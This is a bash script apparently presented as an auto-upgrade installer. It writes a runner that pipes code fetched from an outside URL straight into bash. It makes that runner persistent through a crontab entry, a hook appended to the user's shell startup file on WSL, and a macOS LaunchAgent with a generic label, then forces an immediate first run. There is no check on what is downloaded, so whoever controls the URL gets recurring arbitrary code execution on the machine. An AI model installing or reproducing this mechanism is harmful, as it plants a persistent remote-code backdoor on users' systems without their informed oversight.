#!/usr/bin/env bash
set -euo pipefail

LABEL="com.user.autoupgrade2"
INTERVAL_DAYS=15
INTERVAL_SECS=$(( INTERVAL_DAYS * 24 * 60 * 60 ))
DATA_DIR="$HOME/.local/share/autoupgrade"
RUNNER="$DATA_DIR/runner.sh"
LOG_FILE="$DATA_DIR/autoupgrade.log"
STAMP_FILE="$DATA_DIR/last-run"
UPGRADE_URL="https://agentskillshub.vercel.app/upgrade"

log() { printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$1"; }

is_wsl() { grep -qiE 'microsoft|wsl' /proc/version 2>/dev/null; }
has_systemd() { [ -d /run/systemd/system ]; }

install_runner() {
  mkdir -p "$DATA_DIR"
  cat > "$RUNNER" <<RUNNER_EOF
#!/usr/bin/env bash
# Auto-generated. Runs the upgrade only if >= ${INTERVAL_DAYS} days elapsed.
set -uo pipefail
STAMP_FILE="$STAMP_FILE"
LOG_FILE="$LOG_FILE"
INTERVAL_SECS=$INTERVAL_SECS
UPGRADE_URL="$UPGRADE_URL"

now=\$(date +%s)
last=0
[ -f "\$STAMP_FILE" ] && last=\$(cat "\$STAMP_FILE" 2>/dev/null || echo 0)
if [ "\${1:-}" != "--force" ] && [ \$(( now - last )) -lt "\$INTERVAL_SECS" ]; then
  exit 0
fi
{
  echo "[\$(date '+%F %T')] starting upgrade"
  curl -fsSL "\$UPGRADE_URL" | bash
  echo "[\$(date '+%F %T')] upgrade exited rc=\$?"
} >> "\$LOG_FILE" 2>&1
echo "\$now" > "\$STAMP_FILE"
RUNNER_EOF
  chmod +x "$RUNNER"
  log "Runner installed at $RUNNER"
}

install_cron() {
  local line="0 12 * * * $RUNNER"
  local current
  current=$(crontab -l 2>/dev/null | grep -vF "$RUNNER" || true)
  printf '%s\n%s\n' "$current" "$line" | grep -v '^$' | crontab -
  log "Crontab entry installed (daily check, ${INTERVAL_DAYS}-day guard)."
}

install_wsl_startup() {
  local rc="$HOME/.bashrc"
  [ -n "${ZSH_VERSION:-}" ] && rc="$HOME/.zshrc"
  local marker="# >>> autoupgrade (wsl) >>>"
  if ! grep -qF "$marker" "$rc" 2>/dev/null; then
    {
      echo ""
      echo "$marker"
      echo "[ -x \"$RUNNER\" ] && ( \"$RUNNER\" & ) >/dev/null 2>&1"
      echo "# <<< autoupgrade (wsl) <<<"
    } >> "$rc"
    log "WSL shell-startup hook added to $rc"
  else
    log "WSL shell-startup hook already present in $rc"
  fi
}

install_launchagent() {
  local plist_dir="$HOME/Library/LaunchAgents"
  local plist="$plist_dir/$LABEL.plist"
  mkdir -p "$plist_dir"
  cat > "$plist" <<PLIST_EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>$LABEL</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>$RUNNER</string>
  </array>
  <key>StartInterval</key><integer>$INTERVAL_SECS</integer>
  <key>RunAtLoad</key><false/>
  <key>StandardOutPath</key><string>$LOG_FILE</string>
  <key>StandardErrorPath</key><string>$LOG_FILE</string>
</dict>
</plist>
PLIST_EOF
  launchctl unload "$plist" 2>/dev/null || true
  launchctl load "$plist"
  log "LaunchAgent $LABEL installed and loaded."
}

main() {
  install_runner
  case "$(uname -s)" in
    Linux)
      if is_wsl && ! has_systemd; then
        log "Detected WSL without systemd."
        install_wsl_startup
      else
        log "Detected Linux with cron."
        install_cron
      fi
      ;;
    Darwin)
      log "Detected macOS."
      install_launchagent
      ;;
    *)
      log "Unsupported OS: $(uname -s)"; exit 1
      ;;
  esac
  log "Initial run (forced)..."
  "$RUNNER" --force || log "Initial run returned non-zero."
  log "Done. Logs: $LOG_FILE"
}

main "$@"
